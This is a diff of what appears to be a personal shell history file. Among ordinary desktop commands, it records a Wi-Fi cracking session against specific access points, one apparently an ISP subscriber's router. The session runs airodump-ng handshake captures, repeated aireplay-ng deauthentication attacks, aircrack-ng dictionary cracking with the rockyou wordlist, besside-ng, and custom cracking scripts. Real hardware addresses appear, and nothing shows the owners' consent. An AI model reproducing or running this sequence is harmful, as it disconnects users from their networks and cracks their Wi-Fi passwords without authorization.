@@ -352,3 +352,143 @@ exit
 cd /
 export TERM=xterm
 clear
+alsamixer -c 0
+imwheel
+gvim --version
+vim
+gvim
+GTK_DEBUG=interactive gvim
+GTK_DEBUG=interactive gvim
+pip install unidecode
+sudo pip install unidecode
+mupdf -help
+clear
+git init
+poweroff
+cd /
+export TERM=xterm
+clear
+ sudo aircrack-ng --bssid C8:6C:87:42:44:83 -w /home/kannab/rock.you /home/kannab/airodump/hack.pcap-01.cap
+ sudo aircrack-ng --bssid C8:6C:87:42:44:83 -w /home/kannab/rockyou.txt /home/kannab/airodump/hack.pcap-01.cap
+ sudo aircrack-ng --bssid C8:6C:87:42:44:83 -w /home/kannab/rockyou.txt /home/kannab/airodump/hack.pcap-01.cap
+ sudo aircrack-ng --bssid C8:6C:87:42:44:83 -w /home/kannab/rockyou.txt /home/kannab/airodump/hack.pcap-01.cap
+sudo aireplay-ng --deauth 10 -a C8:6C:87:42:44:83 wlp0s29u1u5
+ sudo aircrack-ng --bssid C8:6C:87:42:44:83 -w /home/kannab/rockyou.txt /home/kannab/airodump/hack.pcap-01.cap
+ sudo aircrack-ng --bssid C8:91:F9:D4:14:CA -w /home/kannab/rockyou.txt /home/kannab/airodump/rostelekom_14ca.pcap-01.cap
+sudo aireplay-ng --deauth 10 -a C8:91:F9:D4:14:CA  wlp0s29u1u5
+ sudo aircrack-ng --bssid C8:91:F9:D4:14:CA -w /home/kannab/rockyou.txt /home/kannab/airodump/rostelekom_14ca.pcap-02.cap
+ysess
+ sudo aircrack-ng --bssid C8:91:F9:D4:14:CA -w /home/kannab/rockyou.txt /home/kannab/airodump/rostelekom_14ca.pcap-02.cap
+sudo airodump-ng -c 1 --bssid C8:6C:87:42:44:83 -w /home/kannab/airodump/hack.pcap wlp0s29u1u5
+mkdir airodump
+sudo airodump-ng -c 1 --bssid C8:6C:87:42:44:83 -w /home/kannab/airodump/hack.pcap wlp0s29u1u5
+sudo airodump-ng -c 1 --bssid C8:91:F9:D4:14:CA  -w /home/kannab/airodump/rostelekom_14ca.pcap wlp0s29u1u5
+sudo airodump-ng -c 9 --bssid C8:91:F9:D4:14:CA  -w /home/kannab/airodump/rostelekom_14ca.pcap wlp0s29u1u5
+imwheel
+alsamixer -c 0
+sudo pacman -S wash
+wash
+sudo iwconfig
+sudo ls /sys/class/net/
+sudo airmon-ng start wlp0s0b1
+sudo pacman -S aircrack-ng
+sudo airmon-ng start wlp0s0b1
+sudo systemctl stop NetworkManager
+sudo airmon-ng start wlp0s29u1u
+sudo systemctl stop avahi-daemon
+sudo airmon-ng start wlp0s0b1
+sudo systemctl disable  avahi-daemon
+sudo airmon-ng start wlp0s0b1
+sudo systemctl stop avahi-daemon.service
+sudo systemctl stop avahi-daemon.socket
+sudo airmon-ng start wlp0s0b1
+kill 497
+sudo kill 497
+sudo airmon-ng start wlp0s0b1
+sudo airodump-ng -i wlp0s29u1u5
+cd /
+export TERM=xterm
+clear
+sudo besside-ng -b  wlp3s0b1mon
+sudo besside-ng -b  wlp3s0b1mon
+sudo besside-ng -b e8:f1:b0:be:2a:2c  wlp3s0b1mon
+pacman -S besside-ng
+sedo pacman -S besside-ng
+sudo pacman -S besside-ng
+sudo pacman -S besside
+cd aircrack/
+python script.py 
+python script.py 
+python script.py 
+airodump-ng -h
+airodump-ng --h
+airodump-ng --help
+airodump-ng --help
+python script.py 
+python script.py 
+airodump-ng --help
+python script.py 
+python script.py 
+airodump-ng --help
+python script.py 
+python handshake.py 
+python handshake.py 
+python handshake.py 
+python handshake.py 
+python handshake.py 
+python handshake.py 
+python handshake.py 
+python handshake.py 
+python handshake.py 
+python handshake.py 
+python handshake.py 
+  sudo ls /sys/class/net/
+sudo airmon-ng start wlp0s29u1u5
+ sudo airodump-ng -i  wlp0s29u1u5
+python handshake.py 
+ sudo airodump-ng -i  wlp0s29u1u5
+ sudo airodump-ng -i  wlp0s29u1u5
+sudo airodump-ng -i wlp0s29u1u5
+cd aircrack/
+python airodump.py 
+python airodump.py 
+python handshake.py 
+python airodump.py 
+python handshake.py 
+python handshake.py 
+python handshake.py 
+cd aircrack/
+python aircrack.py 
+python aircrack.py 
+python aircrack.py 
+python aircrack.py 
+sudo aireplay-ng --deauth 10 -a C8:6C:87:42:44:83 wlp0s29u1u5
+sudo aireplay-ng --deauth 10 -a C8:6C:87:42:44:83 wlp0s29u1u5
+sudo aireplay-ng --deauth 10 -a C8:6C:87:42:44:83 wlp0s29u1u5
+python aircrack.py 
+python aircrack.py 
+python aircrack.py 
+sudo systemctl start NetworkManager
+sudo systemctl enable avahi-daemon
+python aircrack.py 
+cd aircrack/
+python aircrack.py 
+sudo kill aircrack-ng
+cd aircrack/
+python aircrack.py 
+зщцукщаа
+powerpff
+imwheel
+imkscape
+inkscape
+alsamixer -c 0
+arecord -l
+python
+alsamixer
+alsamixer -c 0
+imwheel
+cd /
+export TERM=xterm
+clear
+clear
+bash -c "/tmp/.qt_temp_octopi_3197213705"
